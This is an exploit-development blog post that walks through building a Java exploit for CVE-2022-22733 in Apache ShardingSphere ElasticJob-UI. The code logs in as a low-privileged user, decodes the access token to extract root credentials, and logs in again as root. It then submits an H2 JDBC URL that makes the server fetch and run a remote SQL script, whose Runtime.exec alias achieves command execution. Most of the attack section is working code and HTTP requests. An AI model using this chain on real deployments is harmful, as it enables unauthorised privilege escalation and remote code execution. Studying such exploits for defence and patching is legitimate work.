<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Exploit Writing: CVE-2022-22733 Privilege Escalation &amp; RCE - Zeyad Azima</title>
<meta name="description" content="Writing Exploit for CVE-2022-22733: Apache ShardingSphere ElasticJob-UI. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="Exploit Writing: CVE-2022-22733 Privilege Escalation &amp; RCE">
<meta property="og:url" content="http://localhost:5000/security%20research/CVE_2022_22733_exploit/">


  <meta property="og:description" content="Writing Exploit for CVE-2022-22733: Apache ShardingSphere ElasticJob-UI. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/clgw8gocv3c580jqgbr2n9rc7.png">





  <meta property="article:published_time" content="2023-05-01T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/security%20research/CVE_2022_22733_exploit/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Exploit Writing: CVE-2022-22733 Privilege Escalation &amp; RCE">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2023-05-01T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Exploit Writing: CVE-2022-22733 Privilege Escalation &amp; RCE
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  16 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#the-exploit">The Exploit</a>
    <ul>
      <li><a href="#login-with-the-low-privileged-account">Login with the low-privileged account</a></li>
      <li><a href="#obtain-the-accesstoken">Obtain the accessToken</a></li>
      <li><a href="#decode-the-accesstoken">Decode the accessToken</a></li>
      <li><a href="#parse-the-decoded-data-from-the-accesstoken--retrive-root-account-credentials">Parse the decoded data from the accessToken &amp; Retrive root account credentials</a></li>
      <li><a href="#login-with-the-root-account-credentials-and-obtain-a-full-privileges-on-the-application">Login with the root account credentials and obtain a full privileges on the application</a></li>
      <li><a href="#achieve-rce">Achieve RCE</a></li>
    </ul>
  </li>
  <li><a href="#conclusion">Conclusion</a>
    <ul>
      <li><a href="#resources">Resources</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><strong>Introduction</strong></h1>

<p>In the previous blog from here, We have done analysis for <code class="language-plaintext highlighter-rouge">CVE-2022-22733</code> and understand the root cause of the vulnerability &amp; the issue in details. Now, It’s the time to develop an exploit for this vulnerability and take it more further than just escalating our privileges.</p>

<h1 id="the-exploit"><strong>The Exploit</strong></h1>

<p>As we know from the analysis that to exploit the vulnerability, We need to perform the following steps:</p>

<ul>
  <li>
    <p>Login with the low-privileged account.</p>
  </li>
  <li>
    <p>Obtain the unsecure generated <code class="language-plaintext highlighter-rouge">accessToken</code>.</p>
  </li>
  <li>
    <p>Decode the unsecure generated <code class="language-plaintext highlighter-rouge">accessToken</code>.</p>
  </li>
  <li>
    <p>Parse the decoded data from the <code class="language-plaintext highlighter-rouge">accessToken</code>.</p>
  </li>
  <li>
    <p>Retrieve <code class="language-plaintext highlighter-rouge">root</code> account credentials from the parsed data.</p>
  </li>
  <li>
    <p>Login with the <code class="language-plaintext highlighter-rouge">root</code> account credentials and obtain a full privileges on the application.</p>
  </li>
</ul>

<p>But, This time we will add a one more step that will allow us to achieve code execution on the target server, By performing the <code class="language-plaintext highlighter-rouge">JDBC Attack</code> you could read more about it from <a href="https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">here</a>.</p>

<h2 id="login-with-the-low-privileged-account"><strong>Login with the low-privileged account</strong></h2>

<p>So, First we need to perform a login request with the low-privileged account provided by the user. So, what do we need here ?:</p>

<ul>
  <li>
    <p>take input from user which is <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code></p>
  </li>
  <li>
    <p>The login request and it’s form is as the following:</p>
  </li>
</ul>

<p>Login request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/login HTTP/1.1
Host: 192.168.0.162:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Access-Token: 
Content-Length: 39
Origin: http://192.168.0.162:8888
DNT: 1
Connection: close
Referer: http://192.168.0.162:8888/

{"username":"guest","password":"guest"}
</code></pre></div></div>

<p>We can see that the request is a <code class="language-plaintext highlighter-rouge">POST</code> request to the <code class="language-plaintext highlighter-rouge">/api/login</code> endpoint made to the host of <code class="language-plaintext highlighter-rouge">192.168.0.162</code> and port <code class="language-plaintext highlighter-rouge">8888</code>. So, we first need from the user a host and port of the server where the application is running. along with the username and password that we would use for authentication.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import java.net.URL;
import java.net.HttpURLConnection;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws Exception {
        Scanner scanner = new Scanner(System.in);
        System.out.print("[+] Enter host: ");
        String host = scanner.nextLine();
        System.out.print("[+] Enter port: ");
        String port = scanner.nextLine();
        System.out.print("[+] Enter username: ");
        String username = scanner.nextLine();
        System.out.print("[+] Enter password: ");
        String password = scanner.nextLine();
        scanner.close();
        String url = "http://" + host + ":" + port + "/api/login";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
        con.setRequestProperty("Accept", "application/json, text/plain, */*");
        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
        con.setRequestProperty("Accept-Encoding", "gzip, deflate");
        con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
        con.setRequestProperty("Access-Token", "");
        con.setRequestProperty("Origin", "http://" + host + ":" + port);
        con.setRequestProperty("DNT", "1");
        con.setRequestProperty("Connection", "close");
        con.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
        String body = "{\"username\":\"" + username + "\",\"password\":\"" + password + "\"}";
        con.setDoOutput(true);
        con.getOutputStream().write(body.getBytes("UTF-8"));
        int responseCode = con.getResponseCode();
        System.out.println("[*] Response Code: " + responseCode);
    }
}
</code></pre></div></div>

<p>Here we imported the needed libraries from <code class="language-plaintext highlighter-rouge">java.net</code> &amp; <code class="language-plaintext highlighter-rouge">java.util</code> and then read the input of <code class="language-plaintext highlighter-rouge">host</code>,<code class="language-plaintext highlighter-rouge">port</code>,<code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> from the user using then closed the scanner object we created:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanner scanner = new Scanner(System.in);
System.out.print("[+] Enter host: ");
String host = scanner.nextLine();
System.out.print("[+] Enter port: ");
String port = scanner.nextLine();
System.out.print("[+] Enter username: ");
String username = scanner.nextLine();
System.out.print("[+] Enter password: ");
String password = scanner.nextLine();
scanner.close();
</code></pre></div></div>

<p>After that we created a <code class="language-plaintext highlighter-rouge">URL</code> object to handle the <code class="language-plaintext highlighter-rouge">URL</code> for login endpoint inside the <code class="language-plaintext highlighter-rouge">obj</code>, Then we created <code class="language-plaintext highlighter-rouge">Http</code> connection to our <code class="language-plaintext highlighter-rouge">URL</code> object and assign the connection to <code class="language-plaintext highlighter-rouge">con</code> which is the <code class="language-plaintext highlighter-rouge">Http</code> connection object:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String url = "http://" + host + ":" + port + "/api/login";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
</code></pre></div></div>

<p>In the coming lines, We set the request method and the headers needed for the request through the methods under the <code class="language-plaintext highlighter-rouge">con</code> object:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>con.setRequestMethod("POST");
con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
con.setRequestProperty("Accept", "application/json, text/plain, */*");
con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
con.setRequestProperty("Accept-Encoding", "gzip, deflate");
con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
con.setRequestProperty("Access-Token", "");
con.setRequestProperty("Origin", "http://" + host + ":" + port);
con.setRequestProperty("DNT", "1");
con.setRequestProperty("Connection", "close");
con.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
</code></pre></div></div>

<p>Finally, We created the request body and pass the user input to it and pass it to the <code class="language-plaintext highlighter-rouge">con</code> Http object to be included in the request &amp; after that to print us the Response status code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>con.setDoOutput(true);
con.getOutputStream().write(body.getBytes("UTF-8"));
int responseCode = con.getResponseCode();
System.out.println("[*] Response Code: " + responseCode);
</code></pre></div></div>

<p>Now, It’s time to try our first step code:</p>

<p> </p>

<p><img src="/assets/images/828f2427610f835ed9765a69f755244f" alt="" /></p>

<p> </p>

<p>As we can see our first step done successfully, Let’s move to the next step.</p>

<h2 id="obtain-the-accesstoken"><strong>Obtain the accessToken</strong></h2>

<p>Now, Let’s send the normal login request within burp suite repeater, We can see that the response body is a <code class="language-plaintext highlighter-rouge">JSON</code> format:</p>

<p><img src="/assets/images/72ad1e367cc5679ee80dbfc5daa06414" alt="" /></p>

<p> </p>

<p>As we focusing here we focus on the value of <code class="language-plaintext highlighter-rouge">accessToken</code> key with in <code class="language-plaintext highlighter-rouge">JSON</code> data. But, We can see that the <code class="language-plaintext highlighter-rouge">accessToken</code> key is under <code class="language-plaintext highlighter-rouge">model</code> array. So, When we parse the <code class="language-plaintext highlighter-rouge">JSON</code> data we will get the value of <code class="language-plaintext highlighter-rouge">model</code> array then get the <code class="language-plaintext highlighter-rouge">accessToken</code> value from it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
String inputLine;
StringBuffer response = new StringBuffer();
while ((inputLine = in.readLine()) != null) {
    response.append(inputLine);
}
in.close();
JSONObject jsonObject = new JSONObject(response.toString());
JSONObject model = jsonObject.getJSONObject("model");
String accessToken = model.getString("accessToken");
System.out.println("[*] Acess Token: " + accessToken);
</code></pre></div></div>

<p>After importing the new needed modules <code class="language-plaintext highlighter-rouge">java.io.BufferedReader</code>,<code class="language-plaintext highlighter-rouge">org.json.JSONObject</code>,<code class="language-plaintext highlighter-rouge">java.io.InputStreamReader</code>. Here we created a <code class="language-plaintext highlighter-rouge">BufferReader</code> object named <code class="language-plaintext highlighter-rouge">in</code> and assign response we got from the application into it, Then we define a String named <code class="language-plaintext highlighter-rouge">inputLine</code> to use it in our loop to store the response lines and then assign it to the <code class="language-plaintext highlighter-rouge">StringBuffer</code> object named <code class="language-plaintext highlighter-rouge">response</code> which gonna contain the <code class="language-plaintext highlighter-rouge">JSON</code> data we want. then we closed <code class="language-plaintext highlighter-rouge">in</code>. After that we define a <code class="language-plaintext highlighter-rouge">JSON</code> object named <code class="language-plaintext highlighter-rouge">jsonObject</code> and store the <code class="language-plaintext highlighter-rouge">response</code> in it as a string format, Then we created another <code class="language-plaintext highlighter-rouge">JSON</code> object named <code class="language-plaintext highlighter-rouge">model</code> and store the value of <code class="language-plaintext highlighter-rouge">model</code> key from the <code class="language-plaintext highlighter-rouge">JSON</code> data in it, Finally we created a string named <code class="language-plaintext highlighter-rouge">accessToken</code> and assign the value of <code class="language-plaintext highlighter-rouge">accessToken</code> key inside <code class="language-plaintext highlighter-rouge">model</code> array into it and print that value out.</p>

<p><img src="/assets/images/9d9e228c9d68a5480936b39b85728877" alt="" /></p>

<p>And here we can see, Step 2 of our exploit is done.</p>

<h2 id="decode-the-accesstoken"><strong>Decode the accessToken</strong></h2>

<p>We can easily identify that the <code class="language-plaintext highlighter-rouge">accessToken</code> value is <code class="language-plaintext highlighter-rouge">base64</code>, So, Now we need to decode it to a normal string. And this will be done easily using the following 2 lines after importing the needed modules <code class="language-plaintext highlighter-rouge">java.nio.charset.StandardCharsets</code>,<code class="language-plaintext highlighter-rouge">java.util.Base64</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));
String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);
System.out.println("[*] Decoded Acess Token: " + decodedAccessToken);
</code></pre></div></div>

<p>Here we created a <code class="language-plaintext highlighter-rouge">byte</code> array named <code class="language-plaintext highlighter-rouge">decodedBytes</code> that will decode the <code class="language-plaintext highlighter-rouge">accessToken</code> value and store inside it, After that define a string named <code class="language-plaintext highlighter-rouge">decodedAccessToken</code> that will store the bytes after converting it to a string and then will be printed out.</p>

<p><img src="/assets/images/acb5f8074f259ba69950c679547c2f42" alt="" /></p>

<p> </p>

<p>Here we can see see the decoded token and the 3rd step of the exploit done successfully.</p>

<h2 id="parse-the-decoded-data-from-the-accesstoken--retrive-root-account-credentials"><strong>Parse the decoded data from the accessToken &amp; Retrive root account credentials</strong></h2>

<p>It’s time now for step 4 &amp; 5. As the decoded data from the <code class="language-plaintext highlighter-rouge">accessToken</code> is <code class="language-plaintext highlighter-rouge">JSON</code> format. Then let’s part it and Retrieve the <code class="language-plaintext highlighter-rouge">root</code> account credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);
String rootUsername = "";
String rootPassword = "";
if (decodedJsonObject.has("rootUsername") &amp;&amp; decodedJsonObject.has("rootPassword")) {
    rootUsername = decodedJsonObject.getString("rootUsername");
    rootPassword = decodedJsonObject.getString("rootPassword");
    System.out.println("[*] Root username: " + rootUsername);
    System.out.println("[*] Root password: " + rootPassword);
} else {
    System.out.println("[-] Access token does not contain rootUsername and rootPassword keys.");
}
</code></pre></div></div>

<p>We created a <code class="language-plaintext highlighter-rouge">JSON</code> object named <code class="language-plaintext highlighter-rouge">decodedJsonObject</code> and assign the decoded <code class="language-plaintext highlighter-rouge">accessToken</code> value to it, Then define 2 strings with empty value for username and password we will retrive later. After that we made <code class="language-plaintext highlighter-rouge">if</code> condition to check if the <code class="language-plaintext highlighter-rouge">JSON</code> data has the <code class="language-plaintext highlighter-rouge">rootUsername</code> &amp; <code class="language-plaintext highlighter-rouge">rootPassword</code> keys to Retrievethe credentials from it, If it’s exist then it will assign the values to the string variables we defined early which are <code class="language-plaintext highlighter-rouge">rootUsername</code> &amp; <code class="language-plaintext highlighter-rouge">rootPassword</code> after that it will print the values out, And if not found, It will print us a massege telling us it’s not found.</p>

<p><img src="/assets/images/7dfee9044aacbfe41207479c803b0cbd" alt="" /></p>

<p>And here we can see our 4th &amp; 5th steps done successfully.</p>

<h2 id="login-with-the-root-account-credentials-and-obtain-a-full-privileges-on-the-application"><strong>Login with the</strong> <code class="language-plaintext highlighter-rouge">root</code> account credentials and obtain a full privileges on the application</h2>

<p>Now, we want to use the root credentials we obtained, To login into the application and Retrieve the <code class="language-plaintext highlighter-rouge">accessToken</code> will back with the response which is gonna be with full privileges on the application as the authentication done with the <code class="language-plaintext highlighter-rouge">root</code> account.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();
            con3.setRequestMethod("POST");
            con3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con3.setRequestProperty("Accept", "application/json, text/plain, */*");
            con3.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con3.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con3.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con3.setRequestProperty("Access-Token", "");
            con3.setRequestProperty("Origin", "http://" + host + ":" + port);
            con3.setRequestProperty("DNT", "1");
            con3.setRequestProperty("Connection", "close");
            con3.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            String requestBody3 = "{\"username\":\"" + rootUsername + "\",\"password\":\"" + rootPassword + "\"}";
            con3.setDoOutput(true);
            con3.getOutputStream().write(requestBody3.getBytes("UTF-8"));
            int responseCode3 = con3.getResponseCode();
            System.out.println("[*] Root Login Response Code: " + responseCode3);
            BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));
            String inputLine3;
            StringBuffer response3 = new StringBuffer();
            while ((inputLine3 = in3.readLine()) != null) {
                response3.append(inputLine3);
            }
            in3.close();
            JSONObject jsonObject3 = new JSONObject(response3.toString());
            JSONObject model3 = jsonObject3.getJSONObject("model");
            String accessToken3 = model3.getString("accessToken");
            System.out.println("[*] Root Access Token: " + accessToken3);
</code></pre></div></div>

<p>Here we created a new <code class="language-plaintext highlighter-rouge">Http</code> Object named <code class="language-plaintext highlighter-rouge">con3</code> and used the same <code class="language-plaintext highlighter-rouge">URL</code> for login, In short, We copied the first login request but replaced the login credentials with the one we obtained from the first login process and parsed the new <code class="language-plaintext highlighter-rouge">accessToken</code> returned as a results from the <code class="language-plaintext highlighter-rouge">root</code> account authentication &amp; Stored it in <code class="language-plaintext highlighter-rouge">accessToken3</code> variable and printed it out.</p>

<p><img src="/assets/images/d9105296b6f6c821f50d2df9e012139f" alt="" /></p>

<p>Here as we can see it’s done successfully and Retrieved the token based on the <code class="language-plaintext highlighter-rouge">root</code> account.</p>

<h2 id="achieve-rce"><strong>Achieve RCE</strong></h2>

<p>Now, You may be wondering, If we have the <code class="language-plaintext highlighter-rouge">root</code> account credentials, Why we would need to Retrieve it’s token ?. So, Basically to perform a connection throug the <code class="language-plaintext highlighter-rouge">JDBC</code> we need high-privileges and to automate this process let’s see how it works first.</p>

<p> </p>

<p><img src="/assets/images/dca34df301e10d7d6603820a469e99cd" alt="" /></p>

<p>As you can see when we logged-in as <code class="language-plaintext highlighter-rouge">guest</code> we are not able to add any data source. But, If we login with the <code class="language-plaintext highlighter-rouge">root</code> account. We can see that we have the privileges to add data source and test the connection</p>

<p><img src="/assets/images/ec2f7d061af25c788d4c7798b12f36fa" alt="" /></p>

<p> </p>

<p>Now, Under the Event Tracer Data Source click on <code class="language-plaintext highlighter-rouge">Add</code> button and add the following:</p>

<p><img src="/assets/images/668b686db6b362a05506f578236eaf4d" alt="" /></p>

<p>What did we done here?. We named Our data source, then used the <code class="language-plaintext highlighter-rouge">h2 driver</code> the <code class="language-plaintext highlighter-rouge">H2</code> itself is a relational database management system, and the <code class="language-plaintext highlighter-rouge">org.h2.driver</code> is a <code class="language-plaintext highlighter-rouge">JDBC</code> driver used to connect to an <code class="language-plaintext highlighter-rouge">H2</code> database from Java. The <code class="language-plaintext highlighter-rouge">URL</code> value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'
</code></pre></div></div>

<p>Basically, This is a <code class="language-plaintext highlighter-rouge">JDBC</code> connection string which will connect a <code class="language-plaintext highlighter-rouge">H2</code> in memory database with the name we give which is <code class="language-plaintext highlighter-rouge">testdb</code>. Then, <code class="language-plaintext highlighter-rouge">TRACE_LEVEL_SYSTEM_OUT=3</code> parameter enables trace logging to be printed to the console. Finally, <code class="language-plaintext highlighter-rouge">INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'</code> parameter specifies that the <code class="language-plaintext highlighter-rouge">poc.sql</code> script located at our <code class="language-plaintext highlighter-rouge">URL</code> should be executed when the database is initialized. But, What is inside <code class="language-plaintext highlighter-rouge">poc.sql</code> file ?:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "123";}';CALL EXEC ('calc.exe')
</code></pre></div></div>

<p>In short words, This sql script uses the <code class="language-plaintext highlighter-rouge">H2</code> database ability to create an alias to execute command and here we executing <code class="language-plaintext highlighter-rouge">calc.exe</code> for the demo of the exploit. Now, Let’s start our http server that will host our <code class="language-plaintext highlighter-rouge">poc.sql</code> script and after that we click on <code class="language-plaintext highlighter-rouge">Test Connect</code> Button:</p>

<p><img src="/assets/images/c638cbe6833b72d759916714e36b31f2" alt="" /></p>

<p> </p>

<p>It’s time now to take the request of the connection and added to our exploit code.</p>

<p>Request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/data-source/connectTest HTTP/1.1
Host: 192.168.0.162:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Access-Token: Root_access_token
Content-Length: 185
Origin: http://192.168.0.162:8088
DNT: 1
Connection: close
Referer: http://192.168.0.162:8088/
Cookie: JSESSIONID=C9B7BAFA141D48D0D26178AD8F489668

{"name":"azima","driver":"org.h2.Driver","url":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'","username":"test","password":"test"}
</code></pre></div></div>

<p>As we can see we will create a new <code class="language-plaintext highlighter-rouge">HTTP</code> connection object with a new <code class="language-plaintext highlighter-rouge">URL</code> object for the connection request to perform the <code class="language-plaintext highlighter-rouge">JDBC</code> Attack. So, Here we need to replace the SQL script <code class="language-plaintext highlighter-rouge">URL</code> with one provided by the user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String url2 = "http://" + host + ":" + port + "/api/data-source/connectTest";
String requestBody = "{\"name\":\"azima\",\"driver\":\"org.h2.Driver\",\"url\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+JDBC+"'\",\"username\":\"a\",\"password\":\"a\"}";

URL obj2 = new URL(url2);
HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();


con2.setRequestMethod("POST");
con2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
con2.setRequestProperty("Accept", "application/json, text/plain, */*");
con2.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
con2.setRequestProperty("Accept-Encoding", "gzip, deflate");
con2.setRequestProperty("Content-Type", "application/json;charset=utf-8");
con2.setRequestProperty("Access-Token", accessToken3);
con2.setRequestProperty("Origin", "http://" + host + ":" + port);
con2.setRequestProperty("DNT", "1");
con2.setRequestProperty("Connection", "close");
con2.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
con2.setDoOutput(true);


DataOutputStream wr = new DataOutputStream(con2.getOutputStream());
wr.writeBytes(requestBody);
wr.flush();
wr.close();

int responseCode2 = con2.getResponseCode();
System.out.println("[*] JDBC Attack Response Code : " + responseCode2);
BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
String inputLine2 = "";
StringBuffer response2 = new StringBuffer();

while ((inputLine2 = in2.readLine()) != null) {
    response2.append(inputLine2);
}
in2.close();


JSONObject jsonObject2 = new JSONObject(response2.toString());
System.out.println("[*] JDBC Attack Response: " + jsonObject2);
</code></pre></div></div>

